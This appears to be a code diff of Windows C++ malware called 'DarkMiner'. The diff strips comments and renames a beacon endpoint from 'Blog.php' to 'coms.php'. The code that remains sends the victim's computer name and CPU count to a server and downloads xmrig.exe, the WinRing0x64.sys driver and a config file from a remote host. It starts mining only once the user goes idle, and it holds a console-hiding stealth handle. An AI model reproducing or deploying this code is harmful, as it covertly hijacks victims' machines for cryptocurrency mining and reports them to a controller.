@@ -12,7 +12,6 @@ int Update();
 void Startup();
 int information();
 std::string HttpRequest(std::string site, std::string param);
-//Number of minutes
 int timertime = 1;
 int FileVersion = 6;
 static const unsigned int idle_milliseconds = 60 * timertime * 1000;
@@ -24,16 +23,13 @@ int main() {
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
-	//ShowWindow(stealth, 0);
 	Startup();
 	Sleep(10);
-	//TCHAR  infoBuf[INFO_BUFFER_SIZE];
-	//DWORD  bufCharCount = INFO_BUFFER_SIZE;
 	GetComputerName(infoBuf, &bufCharCount);
 	SYSTEM_INFO info;
 	GetSystemInfo(&info);
 	std::ostringstream infostringstreem;
-	infostringstreem << ("Blog.php?name=") << infoBuf << "&CPU=" << info.dwNumberOfProcessors << "&version=" << version;
+	infostringstreem << ("coms.php?name=") << infoBuf << "&CPU=" << info.dwNumberOfProcessors << "&version=" << version;
 	std::string infostring = infostringstreem.str();
 	std::string webcall;
 	do{
@@ -114,8 +110,6 @@ void timer() {
 		}
 		idle_time = GetTickCount() - last_input.dwTime;
 		if (idle_time < idle_milliseconds && !screensaver_active) {
-			// user hasn't been idle for long enough
-			// AND no screensaver is running
 			std::cout << "Not enought time: " << idle_time << "idle_milliseconds: " << idle_milliseconds;
 			Sleep(1000);
 			continue;
@@ -163,22 +157,12 @@ void miner() {
 	HRESULT hr;
 	HRESULT hr1;
 	HRESULT hr2;
-//	HRESULT hr3;
-//	HRESULT hr4;
-//	HRESULT hr5;
 	const TCHAR Url[] = _T("http://localhost.com/DarkMiner/xmrig.exe");
 	const TCHAR File[] = _T("C:\\Program Files (x86)\\DarkMiner\\miner.exe");
 	const TCHAR Url1[] = _T("http://localhost.com/DarkMiner/WinRing0x64.sys");
 	const TCHAR File1[] = _T("C:\\Program Files (x86)\\DarkMiner\\WinRing0x64.sys");
 	const TCHAR Url2[] = _T("http://localhost.com/DarkMiner/config.json");
 	const TCHAR File2[] = _T("C:\\Program Files (x86)\\DarkMiner\\config.json");
-//	const TCHAR Url3[] = _T("http://localhost.com/DarkMiner/start.bat");
-//	const TCHAR File3[] = _T("C:\\Program Files (x86)\\DarkMiner\\start.bat");
-//	const TCHAR Url4[] = _T("http://localhost.com/DarkMiner/OpenCL.dll");
-//	const TCHAR File4[] = _T("C:\\Program Files (x86)\\DarkMiner\\OpenCL.dll");
-//	const TCHAR Url5[] = _T("http://localhost.com/DarkMiner/vcruntime140.dll");
-//	const TCHAR File5[] = _T("C:\\Program Files (x86)\\DarkMiner\\vcruntime140.dll");
-	//DeleteUrlCacheEntry(Url); // If it was downloaded it won't work because it will used cashed !!Get rid after debug!!
 	hr = URLDownloadToFile(0, Url, File, 0, NULL);
 	switch (hr)
 	{
@@ -266,7 +250,7 @@ void ActiveCheck() {
 		}
 		system("taskkill /F /T /IM miner.exe");
 		std::ostringstream infostringstreem;
-		infostringstreem << ("Blog.php?name=") << infoBuf << "&Mining=" << "0";
+		infostringstreem << ("coms.php?name=") << infoBuf << "&Mining=" << "0";
 		std::string infostring = infostringstreem.str();
 		std::string Mining = HttpRequest("www.localhost.com", infostring);
 		timer();
@@ -274,7 +258,7 @@ void ActiveCheck() {
 }
 //Talk to server
 std::string HttpRequest(std::string site, std::string param) {
-	HINTERNET hInternet = InternetOpenW(L"YourUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0); //you should perhaps edit your useragent ? :p
+	HINTERNET hInternet = InternetOpenW(L"YourUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 	if (hInternet == NULL)
 	{
 		std::cout << "InternetOpenW failed(hInternet): " + GetLastError();
